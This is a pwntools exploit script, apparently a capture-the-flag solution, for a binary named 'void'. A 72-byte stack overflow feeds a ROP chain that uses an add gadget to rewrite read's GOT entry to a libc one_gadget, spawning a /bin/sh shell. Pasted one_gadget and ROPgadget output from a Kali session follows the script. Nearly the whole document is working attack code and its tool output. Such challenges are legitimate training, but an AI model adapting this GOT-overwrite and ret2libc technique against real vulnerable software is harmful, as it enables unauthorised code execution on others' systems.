from pwn import *


p = process('./void')
gdb.attach(p, gdbscript='b *0x0000000000401142')
input()

binary = ELF('./void')
libc = ELF('./glibc/libc.so.6')

buffer_length = 72
read_got = binary.got['read']
libc_read_offset = libc.symbols['read']
execve_bin_sh_offset = 0xc961a # one_gadget ./glibc/libc.so.6
diff = execve_bin_sh_offset - libc_read_offset
read_off = binary.sym['read']
print(diff)
payload = b'A' * buffer_length
payload += p64(0x00000000004011b2) # pop rbx, rbp, r12-15
payload += p64(diff, sign='signed') # rbx
payload += p64(read_got + 0x3d) # rbp
payload += p64(0) * 4
payload += p64(0x0000000000401108) # add gadget
payload += p64(read_off) # read()

print(f"PAYLOAD\n {hexdump(payload)}")

p.sendline(payload)
p.interactive()

"""                                                                                                             
┌──(kali㉿kali)-[~/Desktop/challenge]
└─$ one_gadget ./glibc/libc.so.6 
0xc961a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xc961d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xc9620 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
"""

"""                                                                                                          
┌──(kali㉿kali)-[~/Desktop/challenge]
└─$ ROPgadget --binary void
Gadgets information
============================================================
0x0000000000401069 : add ah, dh ; nop dword ptr [rax + rax] ; ret
0x000000000040109b : add bh, bh ; loopne 0x401105 ; nop ; ret
0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401158 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000401118 : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; jmp 0x4010b0
0x0000000000401159 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401068 : add byte ptr [rax], al ; hlt ; nop dword ptr [rax + rax] ; ret
0x0000000000401039 : add byte ptr [rax], al ; jmp 0x401020
0x000000000040115a : add byte ptr [rax], al ; leave ; ret
0x000000000040111a : add byte ptr [rax], al ; nop dword ptr [rax] ; jmp 0x4010b0
0x0000000000401034 : add byte ptr [rax], al ; push 0 ; jmp 0x401020
0x000000000040106e : add byte ptr [rax], al ; ret
0x0000000000401009 : add byte ptr [rax], al ; test rax, rax ; je 0x401012 ; call rax
0x000000000040106d : add byte ptr [rax], r8b ; ret
0x0000000000401107 : add byte ptr [rcx], al ; pop rbp ; ret
0x000000000040115b : add cl, cl ; ret
0x000000000040109a : add dil, dil ; loopne 0x401105 ; nop ; ret

0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret

0x0000000000401013 : add esp, 8 ; ret
0x0000000000401012 : add rsp, 8 ; ret
0x0000000000401067 : and dword ptr [rax], eax ; add ah, dh ; nop dword ptr [rax + rax] ; ret
0x000000000040113f : call qword ptr [rax + 0x4855c3c9]
0x0000000000401010 : call rax
0x00000000004011a4 : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040106a : hlt ; nop dword ptr [rax + rax] ; ret
0x000000000040100e : je 0x401012 ; call rax
0x0000000000401095 : je 0x4010a0 ; mov edi, 0x404030 ; jmp rax
0x00000000004010d7 : je 0x4010e0 ; mov edi, 0x404030 ; jmp rax
0x000000000040103b : jmp 0x401020
0x0000000000401120 : jmp 0x4010b0
0x000000000040109c : jmp rax
0x0000000000401141 : leave ; ret
0x0000000000401032 : loop 0x401063 ; add byte ptr [rax], al ; push 0 ; jmp 0x401020
0x000000000040109d : loopne 0x401105 ; nop ; ret
0x0000000000401102 : mov byte ptr [rip + 0x2f27], 1 ; pop rbp ; ret
0x0000000000401157 : mov eax, 0 ; leave ; ret
0x0000000000401097 : mov edi, 0x404030 ; jmp rax
0x0000000000401140 : nop ; leave ; ret
0x000000000040109f : nop ; ret
0x000000000040106b : nop dword ptr [rax + rax] ; ret
0x000000000040111c : nop dword ptr [rax] ; jmp 0x4010b0
0x00000000004011bd : nop dword ptr [rax] ; ret
0x0000000000401096 : or dword ptr [rdi + 0x404030], edi ; jmp rax
0x00000000004011b4 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004011b6 : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004011b8 : pop r14 ; pop r15 ; ret
0x00000000004011ba : pop r15 ; ret
0x00000000004011b3 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004011b7 : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401109 : pop rbp ; ret
0x00000000004011bb : pop rdi ; ret
0x00000000004011b9 : pop rsi ; pop r15 ; ret
0x00000000004011b5 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401036 : push 0 ; jmp 0x401020
0x0000000000401016 : ret
0x0000000000401153 : retf
0x000000000040100d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x00000000004011c5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004011c4 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040100c : test eax, eax ; je 0x401012 ; call rax
0x0000000000401093 : test eax, eax ; je 0x4010a0 ; mov edi, 0x404030 ; jmp rax
0x00000000004010d5 : test eax, eax ; je 0x4010e0 ; mov edi, 0x404030 ; jmp rax
0x000000000040100b : test rax, rax ; je 0x401012 ; call rax
0x0000000000401098 : xor byte ptr [rax + 0x40], al ; add bh, bh ; loopne 0x401105 ; nop ; ret
"""
